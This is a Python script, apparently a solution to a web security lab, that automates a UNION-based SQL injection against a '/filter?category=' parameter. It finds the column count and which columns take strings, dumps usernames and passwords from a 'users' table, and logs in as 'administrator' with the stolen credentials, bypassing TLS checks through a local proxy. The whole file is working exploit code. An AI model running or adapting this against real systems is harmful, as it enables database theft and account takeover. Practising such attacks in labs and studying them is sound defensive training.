import urllib3
import sys
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def noofcolumns(fullurl):
    #find no of columns
    payload = "'+UNION+SELECT"
    payload1 = "--"
    for i in range(1,10):
        if (i == 1):
            payload2 = payload + "+NULL"
        else:
            payload2 = payload2 + "," + "NULL"
        fullpayload = payload2 + payload1
        fullurlpayload = fullurl+fullpayload
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if r.status_code == 200:
            return i, payload2

def columnsarestr(fullurl):
    #find if columns are string
    i, payload = noofcolumns(fullurl)
    payloadstr = "'abc'"
    payload4 = "--"
    payload1, payload2 = payload[:len(payload)//2+3], payload[len(payload)//2+3:]
    list_p = payload2.replace(","," ").split()
    for j in range(0,i):
        list_p[j] = payloadstr
        payload3 = (", ").join(list_p)
        fullpayload = payload1 + payload3
        fullurlpayload = fullurl + fullpayload + payload4
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if(r.status_code == 500):
            list_p[j] = "NULL"
        else:
            print("Columns ",j+1, "is a string")


def retrievedatafromtable(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    tables = soup.find('table')
    rows1 = tables.find_all('th')
    return rows1

def getCSRF(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def login(username, password, url):
    uri = "/login"
    fullurl = url + uri
    s = requests.Session()
    r = s.get(fullurl, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
            'csrf' : csrf,
            'username': username,
            'password': password


    }
    q = s.post(fullurl, verify=False, proxies=proxies,data= data)
    if 'Log out' in q.text:
        print('Login Bypassed')
    else:
        print('Login not Bypassed')


def retrievingmultiplevaluesinasinglecolumn(url):
       payload = "'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
       uri = "/filter?category="
       fullurl = url + uri
       fullpayload = fullurl + payload
       list_d = []
       r = requests.get(fullpayload, verify = False, proxies=proxies)
       rows1 = retrievedatafromtable(r)
       for row in rows1:
        usernameandpassword = row.get_text()
        list_d = usernameandpassword.split('~')
        if (list_d[0] == 'administrator'):
            username = list_d[0]
            password = list_d[1]
            login(username, password, url)
            break


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage python3 retrieveingdatafromothertables.py <url>")
        print("[-] Example python3 retrieveingdatafromothertables.py https://example.com")

    retrievingmultiplevaluesinasinglecolumn(url)


